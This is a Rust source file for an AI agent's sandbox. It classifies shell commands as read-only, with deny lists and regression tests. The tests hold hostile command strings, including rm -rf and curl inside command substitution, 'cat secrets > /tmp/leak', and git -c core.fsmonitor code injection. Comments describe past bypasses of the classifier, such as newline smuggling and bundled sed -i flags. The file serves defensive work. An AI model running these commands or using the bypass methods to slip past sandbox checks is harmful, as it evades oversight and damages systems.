//! Codex-style known-safe (read-only) shell-command classifier.
//!
//! Mirrors OpenAI Codex CLI's `is_safe_command`: parse a shell command line
//! and decide whether it is *read-only* — i.e. it only inspects the system and
//! cannot mutate the filesystem, network, or process state. The ReadOnly
//! sandbox tier uses this so an agent can still run `git status` / `ls` /
//! `grep` / `cat` to inspect a project — including an **untrusted** one, which
//! `chat.rs` forces to ReadOnly — without being able to write anything.
//!
//! The classifier is deliberately CONSERVATIVE and fail-closed: anything it
//! does not positively recognize as read-only is treated as NOT safe. It never
//! widens write/exec permission; it only lets provably-inspection-only commands
//! through a tier that would otherwise deny all exec. A line is read-only iff
//! **every** pipeline segment is read-only and the line uses no shell construct
//! that could hide a write or arbitrary execution (output redirection, command
//! or process substitution, backticks).

use serde_json::Value;

/// Programs that are read-only regardless of their arguments. Output
/// redirection (`>`), which is the only way most of these could write a file,
/// is rejected by the lexer before we ever look at the program name — so e.g.
/// `cat` can only print to stdout here, never `cat x > y`.
///
/// Deliberately EXCLUDED (each can execute another program or write a file):
/// `env`, `xargs`, `sudo`, `nohup`, `timeout`, `nice`, `time`, `watch`,
/// `eval`, `exec`, `command`, `sh`/`bash`/`zsh`, `ssh`, `tee`, `mount`, `top`.
const ALWAYS_READ_ONLY: &[&str] = &[
    // file/stream inspection
    "ls", "pwd", "echo", "printf", "cat", "bat", "head", "tail", "wc", "nl",
    "tac", "rev", "cut", "tr", "column", "comm", "join", "paste", "fold",
    "expand", "unexpand", "fmt", "sort", "uniq", "look", "strings",
    "hexdump", "xxd", "od", "diff", "cmp",
    // search
    "grep", "egrep", "fgrep", "rg", "ag", "ack",
    // metadata
    "stat", "file", "du", "df", "realpath", "readlink", "basename", "dirname",
    "tree", "wc", "cksum", "md5sum", "sha1sum", "sha256sum", "sha512sum",
    "b2sum",
    // system inspection (read-only)
    "date", "cal", "whoami", "id", "groups", "users", "who", "w", "last",
    "hostname", "uname", "arch", "uptime", "free", "ps", "pstree", "lsblk",
    "lscpu", "lsusb", "lspci", "printenv", "locale", "tty", "which", "type",
    // misc pure functions / filters
    "true", "false", "seq", "yes", "jq", "yq",
];

/// `find` action flags that execute a program, delete, or write a file. Their
/// presence makes a `find` invocation NOT read-only.
const FIND_WRITE_ACTIONS: &[&str] = &[
    "-delete", "-exec", "-execdir", "-ok", "-okdir", "-fprint", "-fprintf",
    "-fls", "-fprint0",
];

/// Read-only `git` subcommands that are safe with any arguments (their args are
/// refs / pathspecs / format strings — none of these subcommands writes).
const GIT_READ_SUBCOMMANDS: &[&str] = &[
    "status", "diff", "log", "show", "rev-parse", "describe", "ls-files",
    "ls-tree", "ls-remote", "cat-file", "show-ref", "for-each-ref", "rev-list",
    "merge-base", "name-rev", "shortlog", "blame", "whatchanged", "grep",
    "count-objects", "var", "help", "version", "annotate", "cherry",
];

/// Read-only `cargo` subcommands (compiling subcommands like `build`/`check`/
/// `test`/`run` write to `target/`, so they are excluded).
const CARGO_READ_SUBCOMMANDS: &[&str] = &[
    "tree", "metadata", "search", "pkgid", "verify-project", "locate-project",
    "read-manifest", "help", "version",
];

/// Classify a command line. Returns `true` only when the whole line is provably
/// read-only.
pub fn is_read_only_command(cmd: &str) -> bool {
    let Some(segments) = lex(cmd) else {
        return false;
    };
    if segments.is_empty() {
        return false;
    }
    segments.iter().all(|seg| segment_is_read_only(seg))
}

/// Pull a command string out of a tool-call payload so the sandbox gate can
/// classify it. Looks for the common command-bearing keys (recursively), and
/// joins an argv array into a single line. Returns `None` when no command-like
/// value is present (the caller then fails closed).
pub fn extract_command(payload_json: &str) -> Option<String> {
    const CMD_KEYS: &[&str] = &[
        "cmd", "command", "commandline", "cmdline", "script", "shell", "bash",
        "sh", "run", "argv",
    ];
    let v: Value = serde_json::from_str(payload_json).ok()?;
    fn value_as_command(v: &Value) -> Option<String> {
        match v {
            Value::String(s) => Some(s.clone()),
            Value::Array(a) => {
                let parts: Vec<String> = a
                    .iter()
                    .filter_map(|x| x.as_str().map(str::to_string))
                    .collect();
                if parts.is_empty() {
                    None
                } else {
                    Some(parts.join(" "))
                }
            }
            _ => None,
        }
    }
    fn search(v: &Value, keys: &[&str]) -> Option<String> {
        match v {
            Value::Object(map) => {
                for (k, child) in map {
                    if keys.contains(&k.to_ascii_lowercase().as_str()) {
                        if let Some(s) = value_as_command(child) {
                            if !s.trim().is_empty() {
                                return Some(s);
                            }
                        }
                    }
                }
                for child in map.values() {
                    if let Some(s) = search(child, keys) {
                        return Some(s);
                    }
                }
                None
            }
            Value::Array(arr) => arr.iter().find_map(|c| search(c, keys)),
            _ => None,
        }
    }
    search(&v, CMD_KEYS)
}

// ---------------------------------------------------------------------------
// Lexer
// ---------------------------------------------------------------------------

fn flush_tok(cur: &mut String, open: &mut bool, seg: &mut Vec<String>) {
    if *open {
        seg.push(std::mem::take(cur));
        *open = false;
    }
}

fn flush_seg(
    cur: &mut String,
    open: &mut bool,
    seg: &mut Vec<String>,
    segments: &mut Vec<Vec<String>>,
) {
    flush_tok(cur, open, seg);
    if !seg.is_empty() {
        segments.push(std::mem::take(seg));
    }
}

/// Lex a command line into pipeline segments of argv tokens. Returns `None`
/// when the line uses a shell construct we refuse to reason about — output
/// redirection (`>`/`>>`), any redirection at all (`<`), command/process
/// substitution (`$(`, `<(`, `>(`), or backticks — since those can hide a
/// write or arbitrary execution.
fn lex(cmd: &str) -> Option<Vec<Vec<String>>> {
    let chars: Vec<char> = cmd.chars().collect();
    let mut segments: Vec<Vec<String>> = Vec::new();
    let mut seg: Vec<String> = Vec::new();
    let mut tok = String::new();
    let mut open = false;
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if in_single {
            if c == '\'' {
                in_single = false;
            } else {
                tok.push(c);
                open = true;
            }
            i += 1;
            continue;
        }
        if in_double {
            match c {
                '"' => in_double = false,
                '`' => return None,
                '$' if chars.get(i + 1) == Some(&'(') => return None,
                '\\' if i + 1 < chars.len() => {
                    tok.push(chars[i + 1]);
                    open = true;
                    i += 2;
                    continue;
                }
                _ => {
                    tok.push(c);
                    open = true;
                }
            }
            i += 1;
            continue;
        }
        // unquoted
        match c {
            '\'' => {
                in_single = true;
                open = true;
                i += 1;
            }
            '"' => {
                in_double = true;
                open = true;
                i += 1;
            }
            '`' => return None,
            '>' => return None,
            '<' => return None,
            '$' if chars.get(i + 1) == Some(&'(') => return None,
            '\\' => {
                if i + 1 < chars.len() {
                    tok.push(chars[i + 1]);
                    open = true;
                    i += 2;
                } else {
                    i += 1;
                }
            }
            '|' => {
                flush_seg(&mut tok, &mut open, &mut seg, &mut segments);
                if chars.get(i + 1) == Some(&'|') {
                    i += 1;
                }
                i += 1;
            }
            '&' => {
                flush_seg(&mut tok, &mut open, &mut seg, &mut segments);
                if chars.get(i + 1) == Some(&'&') {
                    i += 1;
                }
                i += 1;
            }
            ';' => {
                flush_seg(&mut tok, &mut open, &mut seg, &mut segments);
                i += 1;
            }
            // A newline is a command separator in a real shell, not just
            // intra-token whitespace — otherwise a multi-line string like
            // "ls\nrm -rf x" would lex to a single `ls`-headed segment and be
            // classified read-only while the shell runs the `rm`. Split here.
            '\n' | '\r' => {
                flush_seg(&mut tok, &mut open, &mut seg, &mut segments);
                i += 1;
            }
            c if c.is_whitespace() => {
                flush_tok(&mut tok, &mut open, &mut seg);
                i += 1;
            }
            _ => {
                tok.push(c);
                open = true;
                i += 1;
            }
        }
    }
    if in_single || in_double {
        return None; // unterminated quote
    }
    flush_seg(&mut tok, &mut open, &mut seg, &mut segments);
    Some(segments)
}

// ---------------------------------------------------------------------------
// Per-segment classification
// ---------------------------------------------------------------------------

/// `NAME=value` env-assignment prefix? These can set `LD_PRELOAD`,
/// `GIT_SSH_COMMAND`, etc., so a segment that starts with one is never safe.
fn is_env_assignment(tok: &str) -> bool {
    let Some(eq) = tok.find('=') else {
        return false;
    };
    let name = &tok[..eq];
    !name.is_empty()
        && !name.contains('/')
        && name.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn basename(prog: &str) -> &str {
    prog.rsplit(['/', '\\']).next().unwrap_or(prog)
}

fn segment_is_read_only(tokens: &[String]) -> bool {
    let Some(prog_raw) = tokens.first() else {
        return true; // empty segment (filtered by lexer, but be safe)
    };
    if is_env_assignment(prog_raw) {
        return false;
    }
    let prog = basename(prog_raw);
    let args: Vec<&str> = tokens[1..].iter().map(String::as_str).collect();
    classify_program(prog, &args)
}

fn classify_program(prog: &str, args: &[&str]) -> bool {
    if ALWAYS_READ_ONLY.contains(&prog) {
        return true;
    }
    match prog {
        "git" => git_is_read_only(args),
        "find" => !args.iter().any(|a| FIND_WRITE_ACTIONS.contains(a)),
        "cargo" => cargo_is_read_only(args),
        // `sed` is a read filter unless it edits in place (`-i`/`--in-place`).
        "sed" => !sed_edits_in_place(args),
        _ => false,
    }
}

/// True if a `sed` invocation edits files in place. Catches `--in-place`,
/// `--in-place=…`, and the GNU **bundled short-flag** forms where `-i` is not
/// the first letter of the cluster (`sed -ni`, `sed -Ei`, `sed -si …`) — the
/// old `starts_with("-i")` check missed those, letting an in-place write be
/// classified read-only. We over-approximate: any single-dash short-flag
/// cluster containing `i` counts as in-place. That can reject a few exotic
/// read-only `sed` lines (e.g. an `i` inside a bundled `-e` script), but erring
/// toward "not read-only" is the correct fail-closed direction for a security
/// gate.
fn sed_edits_in_place(args: &[&str]) -> bool {
    args.iter().any(|&a| {
        if a == "--in-place" || a.starts_with("--in-place=") {
            return true;
        }
        let bytes = a.as_bytes();
        // single-dash short-flag cluster: starts with '-', not "--", not bare "-"
        bytes.len() >= 2 && bytes[0] == b'-' && bytes[1] != b'-' && a[1..].contains('i')
    })
}

fn cargo_is_read_only(args: &[&str]) -> bool {
    match first_subcommand(args) {
        // No subcommand → `cargo --version` / `cargo --help`: read-only.
        None => true,
        Some(sub) => CARGO_READ_SUBCOMMANDS.contains(&sub),
    }
}

/// The first non-flag token, skipping flags. Does not handle value-taking
/// flags specially; callers that need that (git) use `git_subcommand`.
fn first_subcommand<'a>(args: &[&'a str]) -> Option<&'a str> {
    args.iter().find(|a| !a.starts_with('-')).copied()
}

/// `git` global options that consume the following token as their value, so we
/// must skip that value when hunting for the subcommand (`git -C dir status`).
///
/// `-c` and `--exec-path` are deliberately NOT here — they are arbitrary-code
/// vectors handled by `git_has_dangerous_global` (see below), not safe globals
/// to skip over.
const GIT_VALUE_GLOBALS: &[&str] =
    &["-C", "--git-dir", "--work-tree", "--namespace"];

/// Git global options that can execute arbitrary code, used *before* the
/// subcommand. `-c <key>=<val>` injects config such as `core.fsmonitor` /
/// `core.pager` / `core.sshCommand` that git runs as a shell command even during
/// a "read" subcommand like `status` — a full RCE. `--exec-path[=<dir>]` points
/// git at attacker-controlled sub-program binaries, and `--config-env` is the
/// env-backed equivalent of `-c`. A git line using any of these (in the leading
/// global-option position) is never read-only, regardless of the subcommand.
fn git_has_dangerous_global(args: &[&str]) -> bool {
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if !a.starts_with('-') {
            return false; // reached the subcommand; the globals before it are clean
        }
        if a == "-c"
            || a == "--exec-path"
            || a == "--config-env"
            || a.starts_with("--exec-path=")
            || a.starts_with("--config-env=")
        {
            return true;
        }
        if GIT_VALUE_GLOBALS.contains(&a) {
            i += 2;
        } else {
            i += 1;
        }
    }
    false
}

fn git_subcommand<'a>(args: &[&'a str]) -> Option<(&'a str, Vec<&'a str>)> {
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if a.starts_with('-') {
            // `--key=value` form consumes nothing extra; bare value-globals do.
            if GIT_VALUE_GLOBALS.contains(&a) {
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        return Some((a, args[i + 1..].to_vec()));
    }
    None
}

fn git_is_read_only(args: &[&str]) -> bool {
    // A `-c`/`--exec-path`/`--config-env` global turns even a read subcommand
    // into arbitrary code execution — reject before classifying the subcommand.
    if git_has_dangerous_global(args) {
        return false;
    }
    let Some((sub, rest)) = git_subcommand(args) else {
        // bare `git` (or only globals) prints usage — read-only.
        return true;
    };
    if GIT_READ_SUBCOMMANDS.contains(&sub) {
        return true;
    }
    let positionals: Vec<&str> = rest.iter().filter(|a| !a.starts_with('-')).copied().collect();
    match sub {
        // Listing only: no positional (would name a new branch) and no
        // write/modify flag.
        "branch" => {
            positionals.is_empty()
                && !rest.iter().any(|a| {
                    matches!(
                        *a,
                        "-d" | "-D"
                            | "-m"
                            | "-M"
                            | "-c"
                            | "-C"
                            | "-f"
                            | "--force"
                            | "--delete"
                            | "--move"
                            | "--copy"
                            | "--edit-description"
                            | "--set-upstream-to"
                            | "-u"
                            | "--unset-upstream"
                    )
                })
        }
        // `tag` / `tag -l` / `tag -n` lists; a positional name creates a tag.
        "tag" => {
            positionals.is_empty()
                && !rest
                    .iter()
                    .any(|a| matches!(*a, "-d" | "-a" | "-s" | "-f" | "-m" | "--delete"))
        }
        // `remote` / `remote -v` / `remote show ...` / `remote get-url ...`.
        "remote" => positionals
            .first()
            .map(|s| matches!(*s, "show" | "get-url"))
            .unwrap_or(true),
        // Only the read flags of `config`.
        "config" => rest.iter().any(|a| {
            matches!(
                *a,
                "--get" | "--get-all" | "--get-regexp" | "--get-urlmatch" | "--list" | "-l"
            )
        }),
        // `stash list` / `stash show` only (bare `stash` == push).
        "stash" => positionals.first().map(|s| matches!(*s, "list" | "show")).unwrap_or(false),
        "worktree" => positionals.first().map(|s| *s == "list").unwrap_or(false),
        // `reflog` / `reflog show` reads; `expire` / `delete` writes.
        "reflog" => positionals
            .first()
            .map(|s| !matches!(*s, "expire" | "delete" | "drop"))
            .unwrap_or(true),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_read_tools_are_read_only() {
        for cmd in [
            "ls -la",
            "pwd",
            "cat README.md",
            "head -n 20 src/main.rs",
            "tail -f", // -f tails, still read-only
            "wc -l Cargo.toml",
            "grep -rn TODO src",
            "rg --hidden pattern",
            "echo hello world",
            "find . -name '*.rs'",
            "find src -type f",
            "stat Cargo.toml",
            "sed -n '1,20p' file.rs",
        ] {
            assert!(is_read_only_command(cmd), "expected read-only: {cmd}");
        }
    }

    #[test]
    fn write_and_exec_commands_are_not_read_only() {
        for cmd in [
            "rm -rf build",
            "rm file.txt",
            "mv a b",
            "cp a b",
            "touch new.txt",
            "mkdir foo",
            "chmod +x run.sh",
            "tee out.txt",
            "python script.py",
            "node app.js",
            "make",
            "npm install",
            "cargo build",
            "cargo test",
            "cargo check",
            "sed -i 's/a/b/' file",
            "find . -delete",
            "find . -exec rm {} ;",
            "sudo ls",
            "env FOO=bar ls",
            "FOO=bar ls",
        ] {
            assert!(!is_read_only_command(cmd), "expected NOT read-only: {cmd}");
        }
    }

    #[test]
    fn output_redirection_is_rejected() {
        assert!(!is_read_only_command("cat secrets > /tmp/leak"));
        assert!(!is_read_only_command("ls >> log.txt"));
        assert!(!is_read_only_command("echo hi > file"));
        // input redirection also conservatively rejected
        assert!(!is_read_only_command("cat < /etc/passwd"));
    }

    #[test]
    fn command_substitution_and_backticks_rejected() {
        assert!(!is_read_only_command("echo $(rm -rf /)"));
        assert!(!is_read_only_command("echo `whoami`"));
        assert!(!is_read_only_command("cat \"$(curl evil.sh)\""));
        // process substitution
        assert!(!is_read_only_command("diff <(ls) <(ls)"));
    }

    #[test]
    fn pipelines_require_every_segment_read_only() {
        assert!(is_read_only_command("cat file | grep foo | wc -l"));
        assert!(is_read_only_command("git status | head -20"));
        // a write anywhere in the pipe poisons it
        assert!(!is_read_only_command("cat file | tee out.txt"));
        assert!(!is_read_only_command("ls && rm -rf build"));
        assert!(!is_read_only_command("pwd; python evil.py"));
    }

    #[test]
    fn git_read_subcommands_allowed_writes_denied() {
        for cmd in [
            "git status",
            "git status --porcelain",
            "git diff HEAD~1",
            "git log --oneline -10",
            "git show abc123",
            "git -C /repo status",
            "git rev-parse HEAD",
            "git branch",
            "git branch -a",
            "git branch --list",
            "git tag",
            "git tag -l",
            "git remote -v",
            "git remote show origin",
            "git config --get user.name",
            "git stash list",
            "git worktree list",
        ] {
            assert!(is_read_only_command(cmd), "expected read-only: {cmd}");
        }
        for cmd in [
            "git push",
            "git push --force",
            "git commit -m x",
            "git checkout main",
            "git branch newfeature",
            "git branch -d old",
            "git tag v1.0",
            "git tag -d v1.0",
            "git remote add origin url",
            "git remote set-url origin url",
            "git config user.name me",
            "git stash",
            "git stash pop",
            "git reset --hard",
            "git worktree add ../wt",
            "git reflog expire --all",
        ] {
            assert!(!is_read_only_command(cmd), "expected NOT read-only: {cmd}");
        }
    }

    #[test]
    fn cargo_read_only_subset() {
        assert!(is_read_only_command("cargo tree"));
        assert!(is_read_only_command("cargo metadata --format-version 1"));
        assert!(is_read_only_command("cargo --version"));
        assert!(!is_read_only_command("cargo build"));
        assert!(!is_read_only_command("cargo run"));
    }

    #[test]
    fn extract_command_from_payloads() {
        assert_eq!(
            extract_command(r#"{"cmd":"git status"}"#).as_deref(),
            Some("git status")
        );
        assert_eq!(
            extract_command(r#"{"args":{"command":"ls -la"}}"#).as_deref(),
            Some("ls -la")
        );
        // argv array joined
        assert_eq!(
            extract_command(r#"{"argv":["git","status","--porcelain"]}"#).as_deref(),
            Some("git status --porcelain")
        );
        // no command-bearing key
        assert!(extract_command(r#"{"path":"README.md"}"#).is_none());
        // empty command ignored
        assert!(extract_command(r#"{"cmd":"   "}"#).is_none());
    }

    #[test]
    fn empty_and_malformed_not_read_only() {
        assert!(!is_read_only_command(""));
        assert!(!is_read_only_command("   "));
        assert!(!is_read_only_command("'unterminated"));
    }

    // --- security regressions: confirmed false-positive bypasses ---

    #[test]
    fn git_config_injection_is_not_read_only() {
        // `-c core.fsmonitor=<cmd>` (and siblings) run a shell command during a
        // "read" subcommand — full RCE. The value may arrive as one token
        // (shell-quoted) or split; both must be rejected.
        for cmd in [
            "git -c core.fsmonitor='touch /tmp/PWNED' status",
            "git -c core.pager='touch x' log",
            "git -c core.sshCommand='touch x' ls-remote origin",
            "git --exec-path=/tmp/evil status",
            "git --exec-path /tmp/evil status",
            "git --config-env=core.pager=EVIL log",
        ] {
            assert!(!is_read_only_command(cmd), "expected NOT read-only: {cmd}");
        }
        // A plain `-c`-free read still passes, and a read flag literally named
        // with a leading dash after the subcommand (e.g. `git log -p`) is fine.
        assert!(is_read_only_command("git -C /repo status"));
        assert!(is_read_only_command("git log -p"));
    }

    #[test]
    fn sed_bundled_in_place_is_not_read_only() {
        for cmd in [
            "sed -i 's/a/b/' file",
            "sed -ni 's/a/b/' file",
            "sed -Ei 's/a/b/' file",
            "sed -si 's/a/b/' file",
            "sed --in-place 's/a/b/' file",
            "sed --in-place=.bak 's/a/b/' file",
        ] {
            assert!(!is_read_only_command(cmd), "expected NOT read-only: {cmd}");
        }
        // Pure read filters (no `i` in a short cluster) stay read-only.
        assert!(is_read_only_command("sed -n '1,20p' file"));
        assert!(is_read_only_command("sed -ne 'p' file"));
    }

    #[test]
    fn newline_is_a_command_separator() {
        // A newline must split commands like `;` does — otherwise a destructive
        // second line hides behind a read-only first program.
        assert!(!is_read_only_command("ls\nrm -rf /tmp/x"));
        assert!(!is_read_only_command("cat file\ntouch evil"));
        assert!(!is_read_only_command("ls\r\nmv a b"));
        // Two read-only lines together are still read-only.
        assert!(is_read_only_command("ls\npwd"));
    }
}
